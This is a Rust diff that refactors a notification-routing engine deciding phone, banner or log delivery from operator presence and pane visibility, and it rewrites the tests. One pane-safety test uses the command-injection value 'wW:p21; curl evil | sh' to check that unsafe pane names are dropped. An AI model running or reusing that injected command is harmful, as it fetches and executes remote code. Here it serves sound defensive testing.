@@ -17,9 +17,10 @@
 
 use std::collections::BTreeMap;
 
-use crate::probes::{FocusedPaneProbe, IdleProbe, MoshRateProbe, PhoneMarkerProbe};
+use crate::probes::{IdleProbe, MoshRateProbe, PhoneMarkerProbe, SessionViewProbe};
 use crate::registry::Selection;
 use crate::routing::Leg;
+use crate::surface::{Surface, Visibility};
 
 /// The idle threshold the bash defaults to when `RELAY_DESK_IDLE_SECS` says
 /// nothing: past this the operator counts as away from the desk.
@@ -33,12 +34,8 @@ pub struct Overrides {
     pub desk_idle_secs: Option<u64>,
     pub skip_phone: bool,
     pub force_phone: bool,
-    pub phone_attention: Option<bool>,
     pub moshi_viewing: Option<bool>,
-    pub focused_pane: Option<String>,
-    pub marker_ttl_secs: Option<u64>,
     pub attention_floor_bytes: Option<u64>,
-    pub physical_fresh_secs: Option<u64>,
     /// Set when the variable was PRESENT and non-empty but not a count. The
     /// bash validators reject such a value outright rather than falling back,
     /// and the fallback is what would turn an unknown into a confident
@@ -46,8 +43,6 @@ pub struct Overrides {
     /// threshold where the caller's was garbled.
     pub idle_invalid: bool,
     pub desk_invalid: bool,
-    pub ttl_invalid: bool,
-    pub fresh_invalid: bool,
 }
 
 impl Overrides {
@@ -71,28 +66,17 @@ impl Overrides {
         };
         let (idle_secs, idle_invalid) = read("RELAY_IDLE_SECS");
         let (desk_idle_secs, desk_invalid) = read("RELAY_DESK_IDLE_SECS");
-        let (marker_ttl_secs, ttl_invalid) = read("PNS_PHONE_MARKER_TTL");
-        let (physical_fresh_secs, fresh_invalid) = read("PNS_PHYSICAL_FRESH_SECS");
         Self {
             idle_secs,
             desk_idle_secs,
             skip_phone: set("RELAY_SKIP_PHONE"),
             force_phone: set("RELAY_FORCE_PHONE"),
-            phone_attention: forced("RELAY_PHONE_ATTENTION"),
             moshi_viewing: forced("RELAY_MOSHI_VIEWING"),
-            focused_pane: vars
-                .get("RELAY_HERDR_FOCUSED_PANE")
-                .filter(|pane| !pane.is_empty())
-                .cloned(),
-            marker_ttl_secs,
             // The floor alone keeps the plain fallback: bash reads it with
             // the same `${VAR:-100}` and never validates it separately.
             attention_floor_bytes: count("PNS_ATTENTION_FLOOR_BYTES"),
-            physical_fresh_secs,
             idle_invalid,
             desk_invalid,
-            ttl_invalid,
-            fresh_invalid,
         }
     }
 }
@@ -102,17 +86,22 @@ impl Overrides {
 pub struct Decision {
     /// The legs to dispatch, in delivery order.
     pub legs: Vec<Leg>,
+    /// The lights signal, which rides on top of every long-running event
+    /// rather than being a leg of its own.
+    pub pulse: bool,
     /// The pane was dropped from the event because it failed the safety
     /// check; the caller prints the one warning.
     pub pane_dropped: bool,
 }
 
-/// Decide the plan for one event. `now_secs` is the wall clock, taken once
-/// at the edge; `None` reads as an unreadable clock and fails the marker
-/// check closed.
+/// Decide the plan for one event. `now_secs` is the wall clock, taken once at
+/// the edge; `None` reads as an unreadable clock, which ages nothing.
 ///
-/// ASSEMBLY ONLY: the phone verdict is [`wants_the_phone`], and this decides
-/// the route and the pane result around it.
+/// ASSEMBLY ONLY. Where the operator is looking is `surface::surface`, whether
+/// the origin pane is on screen is `surface::visibility`, and what to do about
+/// it is `surface::plan`. This reads the probes those three need and turns the
+/// plan into legs.
+#[allow(clippy::too_many_arguments)]
 pub fn decide<P>(
     probes: &P,
     selection: &Selection,
@@ -121,146 +110,101 @@ pub fn decide<P>(
     remote_only: bool,
     pane: &str,
     now_secs: Option<u64>,
+    long_running: bool,
+    mobile_watch_card: bool,
 ) -> Decision
 where
-    P: IdleProbe + PhoneMarkerProbe + MoshRateProbe + FocusedPaneProbe,
+    P: IdleProbe + PhoneMarkerProbe + MoshRateProbe + SessionViewProbe,
 {
-    // No selected leg is presence-gated, so the phone verdict cannot change
-    // the plan and no presence reading may be paid for.
-    let want_phone = selection.iter().any(|entry| entry.routing.presence_gated)
-        && wants_the_phone(probes, overrides, local_only, remote_only, pane, now_secs);
+    let delivery = crate::surface::plan(
+        operator_surface(probes, overrides, now_secs),
+        operator_visibility(probes, pane),
+        long_running,
+        mobile_watch_card,
+    );
+    // The two caller overrides survive the arbitration they used to steer:
+    // skip beats force, and both beat the surface.
+    let delivery = crate::surface::DeliveryPlan {
+        phone_card: !overrides.skip_phone && (overrides.force_phone || delivery.phone_card),
+        ..delivery
+    };
 
     Decision {
-        legs: crate::routing::channel_plan(selection, local_only, remote_only, want_phone),
+        legs: crate::routing::channel_plan(selection, local_only, remote_only, delivery),
         pane_dropped: !pane.is_empty() && !crate::safety::pane_is_safe(pane),
+        pulse: delivery.pulse,
     }
 }
 
-/// Whether the phone leg earns this event: presence arbitration, and nothing
-/// else. Reached only when a presence-gated leg is actually selected.
+/// Where the operator is, from the three readings the arbitration needs.
 ///
-/// EVERY READING IS GUARDED by the verdict that would discard it, so a
-/// decision that an override already settled never pays for the probe
-/// underneath it. That is why the readings are taken here, one at a time,
-/// rather than gathered up front.
-fn wants_the_phone<P>(
-    probes: &P,
-    overrides: &Overrides,
-    local_only: bool,
-    remote_only: bool,
-    pane: &str,
-    now_secs: Option<u64>,
-) -> bool
+/// EVERY READING IS GUARDED by the verdict that would discard it: a caller who
+/// already stated the answer never pays for the probe underneath it, and the
+/// rate sample costs a full second of live counters.
+fn operator_surface<P>(probes: &P, overrides: &Overrides, now_secs: Option<u64>) -> Surface
 where
-    P: IdleProbe + PhoneMarkerProbe + MoshRateProbe + FocusedPaneProbe,
+    P: IdleProbe + PhoneMarkerProbe + MoshRateProbe,
 {
-    use crate::presence::{
-        DEFAULT_ATTENTION_FLOOR_BYTES, DEFAULT_PHONE_MARKER_TTL_SECS, DEFAULT_PHYSICAL_FRESH_SECS,
-        attention_band, marker_fresh, mosh_rate_active, moshi_viewing, phone_attention,
-    };
-
     // A garbled threshold is UNKNOWN, never the default: substituting 120
-    // would read an at-desk idle as suppressing a push the bash sends.
-    let desk_idle_secs = if overrides.desk_invalid {
+    // would read a stale desk as fresh and hold the operator at their desk.
+    let desk_fresh_secs = if overrides.desk_invalid {
         None
     } else {
         Some(overrides.desk_idle_secs.unwrap_or(DEFAULT_DESK_IDLE_SECS))
     };
-
-    let decided_without_a_reading = local_only
-        || remote_only
-        || overrides.skip_phone
-        || overrides.force_phone
-        || overrides.idle_invalid;
-    let idle_secs = match overrides.idle_secs {
-        Some(secs) => Some(secs),
-        None if decided_without_a_reading => None,
-        None => probes.idle_secs(),
+    let Some(desk_fresh_secs) = desk_fresh_secs else {
+        return Surface::Away;
     };
 
-    // Skip beats force, so it gates the whole verdict rather than riding
-    // in as another argument.
-    let mut want_phone = !overrides.skip_phone
-        && crate::routing::wants_phone(
-            idle_secs,
-            desk_idle_secs,
-            local_only,
-            remote_only,
-            overrides.force_phone,
-        );
-
-    let viewing_now = || {
-        let rate_active = overrides.moshi_viewing.is_none()
-            && probes.sample_csv().is_some_and(|csv| {
-                mosh_rate_active(
-                    &csv,
-                    overrides
-                        .attention_floor_bytes
-                        .unwrap_or(DEFAULT_ATTENTION_FLOOR_BYTES),
-                )
-            });
-        moshi_viewing(overrides.moshi_viewing, rate_active)
+    let streaming = match overrides.moshi_viewing {
+        Some(forced) => forced,
+        None => probes.sample_csv().is_some_and(|csv| {
+            crate::presence::mosh_rate_active(
+                &csv,
+                overrides
+                    .attention_floor_bytes
+                    .unwrap_or(crate::presence::DEFAULT_ATTENTION_FLOOR_BYTES),
+            )
+        }),
     };
-
-    if !want_phone
-        && !local_only
-        && !remote_only
-        && !overrides.skip_phone
-        && attention_band(
-            idle_secs,
-            desk_idle_secs,
-            if overrides.fresh_invalid {
-                None
-            } else {
-                Some(
-                    overrides
-                        .physical_fresh_secs
-                        .unwrap_or(DEFAULT_PHYSICAL_FRESH_SECS),
-                )
-            },
-        )
-    {
-        let marker_is_fresh = overrides.phone_attention.is_none()
-            && marker_fresh(
-                probes.marker_mtime_secs(),
-                now_secs,
-                if overrides.ttl_invalid {
-                    None
-                } else {
-                    Some(
-                        overrides
-                            .marker_ttl_secs
-                            .unwrap_or(DEFAULT_PHONE_MARKER_TTL_SECS),
-                    )
-                },
-            );
-        // The marker is a stat of one file; the sample is a full second
-        // of live counters, so it runs only once the marker said nothing.
-        let viewing = overrides.phone_attention.is_none() && !marker_is_fresh && viewing_now();
-        want_phone = phone_attention(overrides.phone_attention, marker_is_fresh, viewing);
+    if streaming {
+        return Surface::Mobile;
     }
 
-    if want_phone && !overrides.force_phone && !pane.is_empty() {
-        let focused = match &overrides.focused_pane {
-            Some(pane) => Some(pane.clone()),
-            None => probes.focused_pane(),
-        };
-        if crate::routing::viewed_pane_redundant(pane, &focused.unwrap_or_default())
-            && viewing_now()
-        {
-            want_phone = false;
+    let desk_input_age = if overrides.idle_invalid {
+        None
+    } else {
+        match overrides.idle_secs {
+            Some(secs) => Some(secs),
+            None => probes.idle_secs(),
         }
-    }
+    };
+    // The marker's AGE, not its timestamp: an unreadable clock ages nothing,
+    // which drops the tap out of the arbitration rather than making it
+    // infinitely fresh.
+    let marker_age = now_secs.and_then(|now| Some(now.saturating_sub(probes.marker_mtime_secs()?)));
+    crate::surface::surface(desk_input_age, marker_age, false, desk_fresh_secs)
+}
 
-    want_phone
+/// Whether the origin pane is on screen. An unreadable view is Unknown, which
+/// never suppresses.
+fn operator_visibility<P: SessionViewProbe>(probes: &P, pane: &str) -> Visibility {
+    if pane.is_empty() {
+        return Visibility::Unknown;
+    }
+    match probes.session_view(pane) {
+        Some(view) => crate::surface::visibility(pane, &view),
+        None => Visibility::Unknown,
+    }
 }
 
 #[cfg(test)]
 mod tests {
     use super::{Decision, Overrides, decide};
     use crate::config::parse_config;
-    use crate::probes::{FocusedPaneProbe, IdleProbe, MoshRateProbe, PhoneMarkerProbe};
-    use crate::registry::{Registry, Routing, Selection};
+    use crate::probes::{IdleProbe, MoshRateProbe, PhoneMarkerProbe, SessionViewProbe};
+    use crate::registry::Selection;
+    use crate::surface::SessionView;
     use std::cell::Cell;
     use std::collections::BTreeMap;
 
@@ -271,11 +215,11 @@ mod tests {
         idle: Option<u64>,
         marker_mtime: Option<u64>,
         sample: Option<String>,
-        focused: Option<String>,
+        view: Option<SessionView>,
         idle_reads: Cell<u32>,
         marker_reads: Cell<u32>,
         sample_reads: Cell<u32>,
-        focused_reads: Cell<u32>,
+        view_reads: Cell<u32>,
     }
 
     impl IdleProbe for CountingProbes {
@@ -296,10 +240,32 @@ mod tests {
             self.sample.clone()
         }
     }
-    impl FocusedPaneProbe for CountingProbes {
-        fn focused_pane(&self) -> Option<String> {
-            self.focused_reads.set(self.focused_reads.get() + 1);
-            self.focused.clone()
+    impl SessionViewProbe for CountingProbes {
+        fn session_view(&self, _origin_pane: &str) -> Option<SessionView> {
+            self.view_reads.set(self.view_reads.get() + 1);
+            self.view.clone()
+        }
+    }
+
+    /// A view in which the origin pane is on screen, unzoomed.
+    fn watching(origin: &str) -> SessionView {
+        SessionView {
+            origin_tab: "t1".to_string(),
+            focused_tab: "t1".to_string(),
+            focused_pane: origin.to_string(),
+            panes_in_focused_tab: vec![origin.to_string()],
+            zoomed: false,
+        }
+    }
+
+    /// A view in which the origin pane's tab is not the one on screen.
+    fn elsewhere(_origin: &str) -> SessionView {
+        SessionView {
+            origin_tab: "t1".to_string(),
+            focused_tab: "t2".to_string(),
+            focused_pane: "t2:p9".to_string(),
+            panes_in_focused_tab: vec!["t2:p9".to_string()],
+            zoomed: false,
         }
     }
 
@@ -318,6 +284,156 @@ mod tests {
         decision.legs.iter().map(|leg| leg.name).collect()
     }
 
+    /// One event through the whole engine, with the readings a test cares
+    /// about and defaults for the rest.
+    fn decide_with(probes: &CountingProbes, overrides: &Overrides, pane: &str) -> Decision {
+        decide(
+            probes,
+            &three_selection(),
+            overrides,
+            false,
+            false,
+            pane,
+            Some(1_000_000),
+            false,
+            false,
+        )
+    }
+
+    // --- the plan drives the legs -------------------------------------------
+
+    #[test]
+    fn every_surface_and_visibility_pair_dispatches_the_legs_its_row_planned() {
+        // The engine's half of the matrix: the model decides banner and card,
+        // and these are the LEGS that come out of it. hermes is the durable
+        // log and rides every row, which is what makes the other two the
+        // observable difference.
+        // (label, desk input age, session view, the legs it must dispatch)
+        type Case = (
+            &'static str,
+            Option<u64>,
+            Option<SessionView>,
+            Vec<&'static str>,
+        );
+        let matrix: [Case; 5] = [
+            (
+                "at the desk watching the pane: log only",
+                Some(2),
+                Some(watching("wW:p1")),
+                vec!["hermes"],
+            ),
+            (
+                "at the desk, pane on another tab: banner",
+                Some(2),
+                Some(elsewhere("wW:p1")),
+                vec!["hermes", "macos-banner"],
+            ),
+            (
+                "at the desk, view unreadable: banner, never suppressed on doubt",
+                Some(2),
+                None,
+                vec!["hermes", "macos-banner"],
+            ),
+            (
+                "away, pane on screen: the card still fires",
+                Some(9_000),
+                Some(watching("wW:p1")),
+                vec!["moshi", "hermes"],
+            ),
+            (
+                "away, pane hidden: card, and no banner for an empty room",
+                Some(9_000),
+                Some(elsewhere("wW:p1")),
+                vec!["moshi", "hermes"],
+            ),
+        ];
+        for (label, idle, view, expected) in matrix {
+            let probes = CountingProbes {
+                idle,
+                view,
+                ..CountingProbes::default()
+            };
+            assert_eq!(
+                names(&decide_with(&probes, &Overrides::default(), "wW:p1")),
+                expected,
+                "case: {label}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_streaming_phone_never_gets_a_banner_however_fresh_the_desk_looks() {
+        // The property the matrix rests on: terminal-notifier is a desk
+        // surface, and mobile is not the desk.
+        let probes = CountingProbes {
+            idle: Some(1),
+            sample: Some(
+                "01:00:00,mosh-server.1,,,1000,0\n01:00:01,mosh-server.1,,,9000,0\n".to_string(),
+            ),
+            view: Some(elsewhere("wW:p1")),
+            ..CountingProbes::default()
+        };
+        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
+        let legs = names(&decision);
+        assert!(!legs.contains(&"macos-banner"), "got {legs:?}");
+        assert!(legs.contains(&"moshi"), "got {legs:?}");
+    }
+
+    #[test]
+    fn the_long_running_tier_pulses_and_says_so_in_the_decision() {
+        let probes = CountingProbes {
+            idle: Some(2),
+            view: Some(watching("wW:p1")),
+            ..CountingProbes::default()
+        };
+        let decision = decide(
+            &probes,
+            &three_selection(),
+            &Overrides::default(),
+            false,
+            false,
+            "wW:p1",
+            Some(1_000_000),
+            true,
+            false,
+        );
+        assert!(decision.pulse, "the lights ride on top of every long event");
+        assert_eq!(
+            names(&decision),
+            vec!["hermes"],
+            "and change nothing else about a watched desk pane"
+        );
+    }
+
+    #[test]
+    fn the_mobile_watch_card_toggle_adds_the_card_only_when_it_is_on() {
+        let streaming = || CountingProbes {
+            idle: Some(9_000),
+            sample: Some(
+                "01:00:00,mosh-server.1,,,1000,0\n01:00:01,mosh-server.1,,,9000,0\n".to_string(),
+            ),
+            view: Some(watching("wW:p1")),
+            ..CountingProbes::default()
+        };
+        let with_toggle = |on: bool| {
+            let probes = streaming();
+            let decision: Decision = decide(
+                &probes,
+                &three_selection(),
+                &Overrides::default(),
+                false,
+                false,
+                "wW:p1",
+                Some(1_000_000),
+                true,
+                on,
+            );
+            decision.legs.iter().any(|leg| leg.name == "moshi")
+        };
+        assert!(!with_toggle(false), "default off: the pulse says it alone");
+        assert!(with_toggle(true), "on: the card joins the pulse");
+    }
+
     // --- caller intent ------------------------------------------------------
 
     #[test]
@@ -328,123 +444,61 @@ mod tests {
             force_phone: true,
             ..Overrides::default()
         };
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &overrides,
-            false,
-            false,
-            "",
-            Some(1_000_000),
-        );
-        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
+        assert!(!names(&decide_with(&probes, &overrides, "")).contains(&"moshi"));
     }
 
     #[test]
-    fn a_decided_phone_leg_never_pays_for_the_idle_probe() {
-        // Force, skip, and an idle override each decide the verdict without
-        // the reading; the probe is an unbounded pipe on a path that must
-        // never stall for an answer it cannot use.
-        for overrides in [
-            Overrides {
-                force_phone: true,
-                ..Overrides::default()
-            },
-            Overrides {
-                skip_phone: true,
-                ..Overrides::default()
-            },
-            Overrides {
-                idle_secs: Some(99_999),
-                ..Overrides::default()
-            },
-        ] {
-            let probes = CountingProbes::default();
-            decide(
-                &probes,
-                &three_selection(),
-                &overrides,
-                false,
-                false,
-                "",
-                Some(1_000_000),
-            );
-            assert_eq!(probes.idle_reads.get(), 0, "overrides: {overrides:?}");
-        }
-    }
-
-    #[test]
-    fn a_narrowing_flag_skips_the_idle_probe_too() {
-        for (local, remote) in [(true, false), (false, true)] {
-            let probes = CountingProbes::default();
-            decide(
-                &probes,
-                &three_selection(),
-                &Overrides::default(),
-                local,
-                remote,
-                "",
-                Some(1_000_000),
-            );
-            assert_eq!(probes.idle_reads.get(), 0);
-        }
-    }
-
-    // --- the attention override ---------------------------------------------
-
-    #[test]
-    fn in_the_band_a_fresh_marker_flips_the_desk_verdict_to_away() {
-        // Idle 60 with desk 120 reads "at the desk"; the Back Tap marker
-        // touched 10 seconds ago proves the phone is in hand, so the phone
-        // leg fires anyway.
+    fn force_phone_sends_the_card_from_the_desk_with_the_pane_in_plain_sight() {
+        // The override outranks the surface entirely, which is what moshi-gate
+        // and the hooks rely on.
         let probes = CountingProbes {
-            idle: Some(60),
-            marker_mtime: Some(999_990),
+            idle: Some(1),
+            view: Some(watching("wW:p1")),
             ..CountingProbes::default()
         };
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &Overrides::default(),
-            false,
-            false,
-            "",
-            Some(1_000_000),
-        );
-        assert_eq!(names(&decision), vec!["moshi", "hermes", "macos-banner"]);
-        // The marker alone decided; the one-second sample must not also run.
+        let overrides = Overrides {
+            force_phone: true,
+            ..Overrides::default()
+        };
+        assert!(names(&decide_with(&probes, &overrides, "wW:p1")).contains(&"moshi"));
+    }
+
+    #[test]
+    fn a_forced_streaming_verdict_spares_the_one_second_sample() {
+        // The rate sample costs a full second of live counters, so a caller
+        // who already stated the answer must never pay for it.
+        let probes = CountingProbes {
+            idle: Some(9_000),
+            ..CountingProbes::default()
+        };
+        let overrides = Overrides {
+            moshi_viewing: Some(true),
+            ..Overrides::default()
+        };
+        decide_with(&probes, &overrides, "wW:p1");
         assert_eq!(probes.sample_reads.get(), 0);
     }
 
     #[test]
-    fn below_the_band_the_attention_probes_are_never_consulted() {
-        // A keypress 5 seconds ago proves where the hands are; no marker or
-        // byte-rate reading may overrule it, so neither is taken.
+    fn an_overridden_idle_reading_spares_the_idle_probe() {
         let probes = CountingProbes {
             idle: Some(5),
-            marker_mtime: Some(999_999),
             ..CountingProbes::default()
         };
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &Overrides::default(),
-            false,
-            false,
-            "",
-            Some(1_000_000),
-        );
-        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
-        assert_eq!(probes.marker_reads.get(), 0);
-        assert_eq!(probes.sample_reads.get(), 0);
+        let overrides = Overrides {
+            idle_secs: Some(9_000),
+            ..Overrides::default()
+        };
+        decide_with(&probes, &overrides, "");
+        assert_eq!(probes.idle_reads.get(), 0);
     }
 
     #[test]
-    fn an_unreadable_clock_fails_the_marker_check_closed_but_never_the_push_itself() {
-        // now_secs None: the marker cannot be judged fresh, so no attention
-        // override fires; the ordinary away rule still pushes on its own.
+    fn an_unreadable_clock_ages_no_marker_rather_than_treating_it_as_fresh() {
+        // Without a clock the tap has no age, so it drops out of the
+        // arbitration instead of counting as the newest signal forever.
         let probes = CountingProbes {
-            idle: Some(60),
+            idle: Some(9_000),
             marker_mtime: Some(999_990),
             ..CountingProbes::default()
         };
@@ -456,80 +510,16 @@ mod tests {
             false,
             "",
             None,
+            false,
+            false,
         );
-        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
+        assert!(
+            names(&decision).contains(&"moshi"),
+            "away still cards; the tap simply did not decide it"
+        );
     }
 
-    // --- viewed-pane suppression --------------------------------------------
-
-    #[test]
-    fn the_watched_pane_suppresses_only_the_phone_leg() {
-        let probes = CountingProbes {
-            idle: Some(900),
-            focused: Some("wW:p21".to_string()),
-            ..CountingProbes::default()
-        };
-        let overrides = Overrides {
-            moshi_viewing: Some(true),
-            ..Overrides::default()
-        };
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &overrides,
-            false,
-            false,
-            "wW:p21",
-            Some(1_000_000),
-        );
-        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
-    }
-
-    #[test]
-    fn force_phone_exempts_the_event_from_viewed_pane_suppression() {
-        let probes = CountingProbes {
-            focused: Some("wW:p21".to_string()),
-            ..CountingProbes::default()
-        };
-        let overrides = Overrides {
-            force_phone: true,
-            moshi_viewing: Some(true),
-            ..Overrides::default()
-        };
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &overrides,
-            false,
-            false,
-            "wW:p21",
-            Some(1_000_000),
-        );
-        assert!(names(&decision).contains(&"moshi"));
-    }
-
-    #[test]
-    fn a_different_focused_pane_never_pays_for_the_viewing_sample() {
-        // The one-second sample runs only when the panes already match.
-        let probes = CountingProbes {
-            idle: Some(900),
-            focused: Some("wW:p7".to_string()),
-            ..CountingProbes::default()
-        };
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &Overrides::default(),
-            false,
-            false,
-            "wW:p21",
-            Some(1_000_000),
-        );
-        assert!(names(&decision).contains(&"moshi"));
-        assert_eq!(probes.sample_reads.get(), 0);
-    }
-
-    // --- pane safety and the event ------------------------------------------
+    // --- pane safety --------------------------------------------------------
 
     #[test]
     fn an_unsafe_pane_is_dropped_once_for_every_channel() {
@@ -537,16 +527,7 @@ mod tests {
             idle: Some(900),
             ..CountingProbes::default()
         };
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &Overrides::default(),
-            false,
-            false,
-            "wW:p21; curl evil | sh",
-            Some(1_000_000),
-        );
-        assert!(decision.pane_dropped);
+        assert!(decide_with(&probes, &Overrides::default(), "wW:p21; curl evil | sh").pane_dropped);
     }
 
     #[test]
@@ -555,107 +536,42 @@ mod tests {
             idle: Some(900),
             ..CountingProbes::default()
         };
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &Overrides::default(),
-            false,
-            false,
-            "wW:p21",
-            Some(1_000_000),
-        );
-        assert!(!decision.pane_dropped);
+        assert!(!decide_with(&probes, &Overrides::default(), "wW:p21").pane_dropped);
     }
 
     // --- overrides parsing --------------------------------------------------
 
     #[test]
     fn a_garbage_idle_override_is_unknown_without_a_probe_read() {
-        // Bash keeps a non-empty override and never runs the probe; the
-        // garbled value then fails open in wants_phone. Falling back to the
-        // probe would both pay the read and let a live reading suppress the
-        // push the unknown should have sent.
+        // Bash keeps a non-empty override and never runs the probe. Falling
+        // back to the probe would both pay the read and let a live reading
+        // hold the operator at a desk the override said nothing about.
         let vars = BTreeMap::from([("RELAY_IDLE_SECS".to_string(), "not-a-number".to_string())]);
         let overrides = Overrides::from_env(&vars);
         let probes = CountingProbes {
             idle: Some(5),
             ..CountingProbes::default()
         };
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &overrides,
-            false,
-            false,
-            "",
-            Some(1_000_000),
-        );
+        let decision = decide_with(&probes, &overrides, "");
         assert_eq!(probes.idle_reads.get(), 0);
-        assert!(names(&decision).contains(&"moshi"), "unknown fails open");
-    }
-
-    #[test]
-    fn a_garbage_desk_threshold_fails_open_never_into_the_default() {
-        // Bash rejects the garbled threshold and sends the push; substituting
-        // the 120 default would instead read idle 60 as "at the desk" and
-        // suppress it.
-        let vars = BTreeMap::from([
-            ("RELAY_IDLE_SECS".to_string(), "60".to_string()),
-            ("RELAY_DESK_IDLE_SECS".to_string(), "garbage".to_string()),
-        ]);
-        let overrides = Overrides::from_env(&vars);
-        let probes = CountingProbes::default();
-        let decision = decide(
-            &probes,
-            &three_selection(),
-            &overrides,
-            false,
-            false,
-            "",
-            Some(1_000_000),
+        assert!(
+            names(&decision).contains(&"moshi"),
+            "an unknown desk reading falls toward away, which cards"
         );
-        assert!(names(&decision).contains(&"moshi"), "unknown fails open");
     }
 
     #[test]
-    fn a_selection_with_no_gated_leg_pays_for_no_presence_reading_at_all() {
-        // A hermes-only config makes the phone verdict unable to change the
-        // plan, so no probe may run: the one-second sample on every log-only
-        // event would be the exact cost the laziness header forbids.
-        let mut registry = Registry::new();
-        registry
-            .register(
-                "hermes",
-                Routing {
-                    local: false,
-                    presence_gated: false,
-                    durable: true,
-                    event_dispatched: true,
-                },
-            )
-            .unwrap();
-        let selection = registry
-            .enabled(&parse_config("[plugins.hermes]\nenabled = true\n").unwrap())
-            .unwrap();
+    fn a_garbage_desk_threshold_fails_toward_away_never_into_the_default() {
+        // Substituting the default would read a stale desk as fresh and hold
+        // the operator at a desk they are not at.
+        let vars = BTreeMap::from([("RELAY_DESK_IDLE_SECS".to_string(), "0600".to_string())]);
+        let overrides = Overrides::from_env(&vars);
         let probes = CountingProbes {
-            idle: Some(60),
-            marker_mtime: Some(999_990),
+            idle: Some(5),
             ..CountingProbes::default()
         };
-        let decision = decide(
-            &probes,
-            &selection,
-            &Overrides::default(),
-            false,
-            false,
-            "wW:p21",
-            Some(1_000_000),
-        );
-        assert_eq!(names(&decision), vec!["hermes"]);
-        assert_eq!(probes.idle_reads.get(), 0);
-        assert_eq!(probes.marker_reads.get(), 0);
-        assert_eq!(probes.sample_reads.get(), 0);
-        assert_eq!(probes.focused_reads.get(), 0);
+        let decision = decide_with(&probes, &overrides, "");
+        assert!(names(&decision).contains(&"moshi"));
     }
 
     #[test]
